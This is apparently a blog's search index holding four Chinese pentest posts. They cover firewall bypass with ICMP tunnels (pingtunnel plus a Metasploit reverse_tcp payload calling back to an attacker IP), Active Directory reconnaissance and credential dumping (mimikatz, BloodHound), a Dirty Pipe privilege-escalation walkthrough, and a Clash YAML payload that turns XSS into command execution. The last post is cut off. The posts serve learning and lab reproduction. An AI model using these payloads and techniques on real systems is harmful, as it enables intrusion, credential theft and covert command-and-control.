<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网基础-防火墙规则&amp;组策略</title>
      <link href="/posts/a5e10218/"/>
      <url>/posts/a5e10218/</url>
      
        <content type="html"><![CDATA[<h1 id="内网基础-防火墙规则-amp-组策略"><a href="#内网基础-防火墙规则-amp-组策略" class="headerlink" title="内网基础-防火墙规则&amp;组策略"></a>内网基础-防火墙规则&amp;组策略</h1><p>代理技术和隧道技术分别是什么?</p><ul><li>隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</li><li>代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）<br>连接方向：正向&amp;反向</li></ul><h2 id="单机-防火墙-限制端口出入站"><a href="#单机-防火墙-限制端口出入站" class="headerlink" title="单机-防火墙-限制端口出入站"></a>单机-防火墙-限制端口出入站</h2><p>熟悉常见主机配置不出网的方式</p><p><strong>1、入站&amp;出站&amp;连接安全</strong></p><p>入站即：从外部到内部 如：访问web界面<br>出站即：从内部到外部 如：反向连接shell<br><strong>2、域&amp;专用&amp;公网&amp;状态</strong><br><img src="/posts/a5e10218/image-20220915151933356.png" alt="image-20220915151933356"><br>域:适用在域环境<br>专用:个人环境<br>公用:公共环境<br><strong>3、阻止&amp;允许&amp;其他配置</strong><br><img src="/posts/a5e10218/image-20220915152715593.png" alt="image-20220915152715593"></p><p>程序:针对单个程序进行阻止或者放行<br>端口:针对端口进行阻止或者放行<br>预定义：windows预先设定好的规则<br>自定义:根据自己的需要设定针对程序或端口或协议<br>基础知识已经了解接下来进行测试<br>生成一个监听器为reverse_http的马 端口为8989<br><img src="/posts/a5e10218/image-20220915160019407.png" alt="image-20220915160019407"><br>reverse为反向连接马，bind为正向连接马</p><p>在系统防火墙出站规则限制8989端口<br>运行木马发现没有任何反应，禁用该规则成功上线。<br>木马没有上线的原因就是触发了防火墙规则</p><h2 id="单机-防火墙-限制协议出入站"><a href="#单机-防火墙-限制协议出入站" class="headerlink" title="单机-防火墙-限制协议出入站"></a>单机-防火墙-限制协议出入站</h2><p>添加一条出站规则限制tcp协议 禁止所有tcp协议出站<br><img src="/posts/a5e10218/image-20220915162002946.png" alt="image-20220915162002946"><br>运行木马毫无反应禁用规则重新上线<br><img src="/posts/a5e10218/image-20220915162155407.png" alt="image-20220915162155407"><br>没上线的原因就是触发了tcp协议出站规则<br>限制了tcp协议就没办法上线了么？<br>当然不是的，还可以使用其他协议上线，如下图<br><img src="/posts/a5e10218/w7Lt8eZS5MbUVc3q6nB8gw.png" alt="img"><br><img src="/posts/a5e10218/RTIqD7VEfBePEbjmTbWmtg-1663116129810-3.png" alt="img"><br>学过计网应该知道这些，每层协议都是基于下面一层 如果下面的禁用了上面的也就完蛋，tcp被禁用，还可以使用icmp进行上线，下文中会提到</p><h2 id="域控-防火墙-组策略对象同步"><a href="#域控-防火墙-组策略对象同步" class="headerlink" title="域控-防火墙-组策略对象同步"></a>域控-防火墙-组策略对象同步</h2><p>操作：组策略管理-域-创建GPO链接-防火墙设置<br>域控进入组策略管理<br><img src="/posts/a5e10218/image-20220915164450719.png" alt="image-20220915164450719"><br>在域中创建GPO链接 名称随意<br><img src="/posts/a5e10218/image-20220915164514425.png" alt="image-20220915164514425"></p><p>创建完成后右键编辑进入到策略设置<br><img src="/posts/a5e10218/image-20220915164758655.png" alt="image-20220915164758655"><br>配置防火墙规则禁用tcp协议(记得开启防火墙)<br>域成员更新策略：强制&amp;命令&amp;重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate/force</span><br></pre></td></tr></table></figure><p><img src="/posts/a5e10218/image-20220915170227761.png" alt="image-20220915170227761"><br><img src="/posts/a5e10218/image-20220915170551477.png" alt="image-20220915170551477"></p><h2 id="域控-防火墙-组策略不出网上线"><a href="#域控-防火墙-组策略不出网上线" class="headerlink" title="域控-防火墙-组策略不出网上线"></a>域控-防火墙-组策略不出网上线</h2><p><strong>背景介绍</strong>：域控通过组策略设置防火墙规则同步后，域内用户主机被限制TCP出网，其中规则为出站规则，安全研究者通过入站取得SHELL权限，需要对其进行上线控制。<br><strong>思路：</strong>正向连接&amp;隧道技术<br><strong>如果是入站被限制呢？</strong>反向连接&amp;隧道技术也可以解决（前提看限制的多不多）<br>注意域成员主机可出网<br>实战情况下的两种情况:</p><ul><li>主机出站TCP封杀入站没有无互联网网络<br>正向连接（取得一台有网络的能和主机通讯的服务器权限他有网）<br>把数据给出网的机器通过出网机器正向主动控制他</li><li>主机出站TCP封杀入站没有有互联网网络<br>正向连接（取得一台有网络的能和主机通讯的服务器权限他有网）<br>隧道技术（走其他协议出网即可）</li></ul><p>因为域成员主机收到防火墙策略影响可以ping通baidu.com但是不能访问百度(tcp限制)<br>所以可以利用ICMP协议进行上线</p><p>ICMP协议项目：</p><p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a><br><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a><br>利用思路:<br>就是利用木马将上线流量发送到本地工具端口，工具转换为ICMP流量转到攻击机，攻击机使用工具将收到的icmp流量转化为tcp流量，攻击机接收到上线tcp流量从而上线<br>举例：木马为127.0.0.1 4444端口 ,肉鸡工具监听本地4444端口接收到tcp流量，然后转换为icmp流量发送到攻击机6666端口，攻击机工具将icmp流量转为tcp流量而监听器刚好监听本机6666端口从而上线</p><h4 id="1、CS-ICMP-上线"><a href="#1、CS-ICMP-上线" class="headerlink" title="1、CS-ICMP-上线"></a>1、CS-ICMP-上线</h4><p>这里利用pingtunnel</p><p>攻击机:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server</span><br></pre></td></tr></table></figure><p>肉鸡：(管理器运行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:5555 -s 192.168.46.66 -t 192.168.46.66:6666 -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure><p>CS:</p><p>创建两个监听器 一个为127.0.0.1 一个为攻击机ip</p><p><img src="/posts/a5e10218/image-20220915230950801.png" alt="image-20220915230950801"></p><p>生成127.0.0.1的Stager后门<br>肉鸡执行<br><img src="/posts/a5e10218/image-20220915231213985.png" alt="image-20220915231213985"><br>成功上线</p><h4 id="2、MSF上线"><a href="#2、MSF上线" class="headerlink" title="2、MSF上线"></a>2、MSF上线</h4><p>生成后门：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f exe &gt; xd.exe</span><br></pre></td></tr></table></figure><p>MSF启动监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure><p>攻击机开启隧道：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果运行报错 <span class="built_in">chmod</span> 777 pingtunnel</span></span><br><span class="line">./pingtunnel -type server</span><br></pre></td></tr></table></figure><p><img src="/posts/a5e10218/image-20220915225516712.png" alt="image-20220915225516712"></p><p>肉鸡开启隧道 –将本地3333端口 icmp协议数据转发到攻击机的4444端口流量上(管理员运行)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:3333 -s 101.35.21.250 -t 101.35.21.250:4444 -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure><p>运行msf生成的木马</p><p><img src="/posts/a5e10218/image-20220915225800488.png" alt="image-20220915225800488"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域信息收集</title>
      <link href="/posts/225ec2c9/"/>
      <url>/posts/225ec2c9/</url>
      
        <content type="html"><![CDATA[<h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><h2 id="什么是域环境"><a href="#什么是域环境" class="headerlink" title="什么是域环境"></a>什么是域环境</h2><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，并区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器(DC)，域控制器(DC)中保存着整个域的用户帐号和安全数据库。</p><p>0x01</p><p>一个具有一定规模的企业，每天都可能面临员工入职和离职，因此网络管理部门经常需要对域成员主机进行格式化消除磁盘的文件，然后重装系统及软件，以提供给新员工使用；因此，为了便于后期交接，大多网络管理员会做好一个系统镜像盘，统一安装所有的电脑，并且在安装的时候设置惯用、甚至统一的密码。</p><p>0x02</p><p>因此，域中的计算机本地管理员账号，极有可能能够登陆域中较多的计算机，本地管理员的密码在服务器上后期修改的概率，远低于在个人办公电脑上的概率，而域用户权限是较低的，是无法在域成员主机上安装软件的，这将会发生下面的一幕：</p><p>某个域用户需要使用viso软件进行绘图操作，于是联系网络管理员进行安装，网络管理员采用域管理员身份登录了域成员主机，并帮助其安装了viso软件，于是这个有计算机基础的员工，切换身份登录到了本地计算机的管理员，后执行mimikatz，从内存当中抓取了域管理员的密码，便成功的控制了整个域。</p><p>0x03</p><p>因此，域渗透的思路就是：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。</p><p>当前机器角色的判断–个人PC&amp;文件服务器&amp;邮件服务器等<br>当前机器网络环境判断–局域网&amp;工作组&amp;域环境<br>当前机器角色功能判断–任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p><h2 id="常规信息类收集-应用-amp-服务-amp-权限等"><a href="#常规信息类收集-应用-amp-服务-amp-权限等" class="headerlink" title="常规信息类收集-应用&amp;服务&amp;权限等"></a>常规信息类收集-应用&amp;服务&amp;权限等</h2><p><img src="/posts/225ec2c9/eetivl27t4uy4YiieUguOQ.png" alt="eetivl27t4uy4YiieUguOQ"><br><img src="/posts/225ec2c9/9dxsuZWjbEPQMl2vx1HSBA.png" alt="9dxsuZWjbEPQMl2vx1HSBA"></p><p>更多其他收集见上图命令表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">systeminfo #详细信息</span><br><span class="line">netstat -ano #端口列表</span><br><span class="line">route print #路由表</span><br><span class="line">net start #启动服务</span><br><span class="line">tasklist #进程列表</span><br><span class="line">schtasks #计划任务</span><br><span class="line">ipconfig /all #判断存在域</span><br><span class="line">net view /domain #判断存在域</span><br><span class="line">net time /domain #判断主域</span><br><span class="line">netstat -ano #当前网络端口开放</span><br><span class="line">nslookup 域名 #追踪来源地址</span><br><span class="line">wmic service list brief #查询本机服务</span><br><span class="line">net config workstation  #查询当前登录域及登录用户信息</span><br><span class="line">wmic startup get command,caption #查看已启动的程序信息</span><br></pre></td></tr></table></figure><h2 id="架构信息类收集-网络-amp-用户-amp-域控等"><a href="#架构信息类收集-网络-amp-用户-amp-域控等" class="headerlink" title="架构信息类收集-网络&amp;用户&amp;域控等"></a>架构信息类收集-网络&amp;用户&amp;域控等</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net view /domain #查询域列表</span><br><span class="line">net time/domain #从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务</span><br><span class="line">net localgroup administrators #本机管理员【通常含有域用户】</span><br><span class="line">net user /domain #查询域用户(当前域)</span><br><span class="line">net group /domain #查询域工作组</span><br><span class="line">net group &quot;domain computers&quot; /domain #查看加入域的所有计算机名</span><br><span class="line">net group &quot;domain admins&quot; /domain #查询域管理员用户组和域管用户</span><br><span class="line">net localgroup administrators /domain #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain #查看域控</span><br><span class="line">net accounts /domain #查看域密码策略</span><br></pre></td></tr></table></figure><h2 id="关键信息类收集-密码-amp-凭据-amp-口令等"><a href="#关键信息类收集-密码-amp-凭据-amp-口令等" class="headerlink" title="关键信息类收集-密码&amp;凭据&amp;口令等"></a>关键信息类收集-密码&amp;凭据&amp;口令等</h2><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>计算机用户HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)，CS插件</p><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a><br><a href="https://github.com/AlessandroZ/LaZagne/">https://github.com/AlessandroZ/LaZagne/</a><br><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a><br><a href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></p></blockquote><p>1.站点源码备份文件、数据库备份文件等<br>2.各类数据库Web管理入口，如PHPMyAdmin<br>3.浏览器保存密码、浏览器Cookies<br>4.其他用户会话、3389和ipc$连接记录、回收站内容<br>5.Windows 保存的WIFI密码<br>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等<br>利用CS抓取明文密码需要先提权<br>提权:利用CS插件<br><img src="/posts/225ec2c9/image-20220912105234985.png" alt="image-20220912105234985"><br>提权完成后抓取明文密码<br><img src="/posts/225ec2c9/image-20220912105515362.png" alt="image-20220912105515362"><br>在视图中开启密码凭证<br><img src="/posts/225ec2c9/image-20220912105555583.png" alt="image-20220912105555583"></p><h2 id="自动化工具探针-插件-amp-Adfind-amp-BloodHound"><a href="#自动化工具探针-插件-amp-Adfind-amp-BloodHound" class="headerlink" title="自动化工具探针-插件&amp;Adfind&amp;BloodHound"></a>自动化工具探针-插件&amp;Adfind&amp;BloodHound</h2><blockquote><p><a href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a><br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><br><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p></blockquote><p>CS插件:LSTAR Ladon OLa TaoWu等<br>上传Adfind进行自动化信息搜集<br><img src="/posts/225ec2c9/image-20220912110250086.png" alt="image-20220912110250086"></p><p>Adfind常见命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出域控制器名称</span></span><br><span class="line">AdFind -sc dclist </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中在线的计算机</span></span><br><span class="line">AdFind -sc computers_active</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中在线的计算机(只显示名称和操作系统)</span></span><br><span class="line">AdFind -sc computers_active name operatingSystem</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中所有计算机</span></span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中所有计算机(只显示名称和操作系统)</span></span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询域内所有用户</span></span><br><span class="line">AdFind -users name</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询所有GPO</span></span><br><span class="line">AdFind -sc gpodmp </span><br></pre></td></tr></table></figure><p><img src="/posts/225ec2c9/image-20220912123714674.png" alt="image-20220912123714674"></p><p>BloodHound域分析使用</p><blockquote><p>BloodHound 是一个强大的内网域渗透提权分析工具，构建于 <a href="http://linkurio.us/">Linkurious</a> 之上。BloodHound 采用了原始的 PowerPath 概念背后的一些关键概念，并将这些概念放在一个能运行且直观，并易于使用的功能中，用于提取和分析数据，可以高效准确地显示如何提升 AD 域中的权限。它可以显示两个域中的 “域管理员” 组的有效成员。</p></blockquote><p>安装&amp;使用：</p><blockquote><p><a href="http://cn-sec.com/archives/146548.html">http://cn-sec.com/archives/146548.html</a><br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p></blockquote><p>上传SharpHound.exe(\resources\app\Collectors下)到服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure><p><img src="/posts/225ec2c9/image-20220912124235379.png" alt="image-20220912124235379"></p><p>会生成一个压缩包</p><p>本地启动分析</p><p>1、启动neo4j 下载好后直接运行即可</p><blockquote><p><a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j.bat console</span><br></pre></td></tr></table></figure><p>启动完成到<a href="http://localhost:7474/browser/%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81">http://localhost:7474/browser/修改密码</a></p><p>2、启动BloodHound 直接运行 BloodHound.exe<br>账号密码为就是neo4j的账号密码<br>3、运行程序后将生成数据导入，筛选查看<br><img src="/posts/225ec2c9/image-20220912143847126.png" alt="image-20220912143847126"><br>上传刚才生成的压缩包<br><img src="/posts/225ec2c9/image-20220912143921209.png" alt="image-20220912143921209"><br>点击左上角展开菜单<br><img src="/posts/225ec2c9/image-20220912144033107.png" alt="image-20220912144033107"></p><p>Analysis为所有功能<br><img src="/posts/225ec2c9/image-20220912144311135.png" alt="image-20220912144311135"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Find all Domain Admins  #找到所有域管理员</span><br><span class="line">Find Shortest Paths to Domain Admins #找到域管理员的最短路径</span><br><span class="line">Find Principals with DCSync Rights #查找具有DCSync权限的主体</span><br><span class="line">Users with Foreign Domain Group Membership #具有外部域组成员资格的用户</span><br><span class="line">Groups with Foreign Domain Group Membership #具有外国域组成员的组</span><br><span class="line">Map Domain Trusts #映射领域信托</span><br><span class="line">Shortest Paths to Unconstrained Delegation Systems #无约束委托系统的最短路径 </span><br><span class="line">Shortest Paths from Kerberoastable Users 从kerberostabable #用户的最短路径</span><br><span class="line">Shortest Paths to Domain Admins from Kerberoastable Users #从kerberostable用户到域管理员的最短路径</span><br><span class="line">Shortest Path from Owned Principals #从所有主体出发的最短路径</span><br><span class="line">Shortest Paths to Domain Admins from Owned Principals #从所属主体到域管理员的最短路径</span><br><span class="line">Shortest Paths to High Value Targets #到高价值目标的最短路径</span><br><span class="line">Find Computers where Domain Users are Local Admin #查找域用户为本地管理员的计算机</span><br><span class="line">Find Computers where Domain Users can read LAPS passwords #查找域用户可以读取LAPS密码的计算机</span><br><span class="line">Shortest Paths from Domain Users to High Value Targets #从域用户到高价值目标的最短路径</span><br><span class="line">Find All Paths from Domain Users to High Value Targets #找到从域用户到高值目标的所有路径</span><br><span class="line">Find Workstations where Domain Users can RDP #找到域用户可以RDP的工作站</span><br><span class="line">Find Servers where Domain Users can RDP #找到域用户可以RDP的服务器</span><br><span class="line">Find Dangerous Rights for Domain Users Groups #查找域用户组的危险权限</span><br><span class="line">Find Kerberoastable Members of High Value Groups #查找高值组中可支持kerberos的成员</span><br><span class="line">List all Kerberoastable Accounts #列出所有可kerberos的帐户</span><br><span class="line">Find Kerberoastable Users with most privileges #查找具有最多特权的可支持kerberostaber的用户</span><br><span class="line">Find Domain Admin Logons to non-Domain Controllers #找到非域控制器的域管理登录</span><br><span class="line">Find Computers with Unsupported Operating Systems #查找操作系统不受支持的计算机</span><br><span class="line">Find AS-REP Roastable Users (DontReqPreAuth) #查找AS-REP烘烤用户(DontReqPreAuth)</span><br></pre></td></tr></table></figure><p>点击可查看详细信息<br><img src="/posts/225ec2c9/image-20220912145106437.png" alt="image-20220912145106437"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-0847 Linux内核提权漏洞复现</title>
      <link href="/posts/77a28503/"/>
      <url>/posts/77a28503/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-0847Linux内核提权漏洞复现"><a href="#CVE-2022-0847Linux内核提权漏洞复现" class="headerlink" title="CVE-2022-0847Linux内核提权漏洞复现"></a>CVE-2022-0847Linux内核提权漏洞复现</h1><blockquote><p>漏洞影响版本：5.8 &lt;&#x3D; Linux kernel &lt; 5.16.11&#x2F;5.15.25&#x2F;5.10.102</p><p>POC:<a href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></p></blockquote><blockquote><p>漏洞原理：<a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com</a></p></blockquote><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Linux RedTeam 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU&#x2F;Linux</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit: A root exploit for CVE-2022-0847 (Dirty Pipe) (github.com)</a></p><p>使用方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./exploit  </span><br></pre></td></tr></table></figure><p>执行成功后root密码变为aaron使用命令su输入密码即可进入root命令行</p><p>部分执行完成后直接进入shell</p><p><img src="/posts/77a28503/yDazi35C1ZqLEXF-16590095805203.png" alt="yDazi35C1ZqLEXF"></p><p>恢复密码命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash RCE漏洞复现分析</title>
      <link href="/posts/cb677a8d/"/>
      <url>/posts/cb677a8d/</url>
      
        <content type="html"><![CDATA[<h1 id="Clash-RCE漏洞复现分析"><a href="#Clash-RCE漏洞复现分析" class="headerlink" title="Clash RCE漏洞复现分析"></a>Clash RCE漏洞复现分析</h1><blockquote><p>请各位师傅们务必在本地进行测试，切勿用于非法用途，后果自负。</p></blockquote><blockquote><p>影响范围：</p><p>已知版本&lt;0.19.10受其影响</p></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote><p>Clash：一个 Go 语言开发的多平台代理客户端，懂得都懂</p></blockquote><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>版本需要小于0.19.10</p><p>打开clash选择配置(Profiles)</p><p><img src="/posts/cb677a8d/image-20220228221010788.png" alt="image-20220228221010788"><br>导入POC文件</p><blockquote><p>POC下载：<a href="https://github.com/fattygo/poc-">https://github.com/fattygo/poc-</a></p></blockquote><p>右键连接代理（Proxies）</p><p><img src="/posts/cb677a8d/image-20220228222445170.png" alt="image-20220228222445170"></p><p>执行成功</p><p><img src="/posts/cb677a8d/image-20220228222517633.png" alt="image-20220228222517633"></p><blockquote><p>本次复现仅供学习，切勿用于非法用途，后果自负。</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先看下正常的代理yml文件</p><p>节点之一</p><p><img src="/posts/cb677a8d/image-20220301224509405.png" alt="image-20220301224509405"></p><p>在Clash中的展示为</p><p><img src="/posts/cb677a8d/image-20220301224603800.png" alt="image-20220301224603800"></p><p>不难看出，proxies中的name和type，proxy-groups都展示了出来，这里就联想到xss漏洞</p><p>写个yml来试下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">silent</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;0.0.0.0:9090&#x27;</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&#x27;&lt;img src=x onerror=alert(1) /&gt;&#x27;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">trojan</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">test</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">45645</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">20133544</span><span class="number">-3417</span><span class="number">-3062</span><span class="string">-8ff8-b1dbd032948f</span></span><br></pre></td></tr></table></figure><p>连接代理</p><p><img src="/posts/cb677a8d/image-20220301225601973.png" alt="image-20220301225601973"></p><p><img src="/posts/cb677a8d/image-20220301225620728.png" alt="image-20220301225620728"></p><p>成功弹窗，因此证明了XSS漏洞存在</p><p>接下来改为RCE漏洞试下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">silent</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;0.0.0.0:9090&#x27;</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&#x27;&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;&#x27;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">trojan</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">test</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">45645</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">20133544</span><span class="number">-3417</span><span class="number">-3062</span><span class="string">-8ff8-b1dbd032948f</span></span><br></pre></td></tr></table></figure><p>连接代理</p><p><img src="/posts/cb677a8d/image-20220301230010284.png" 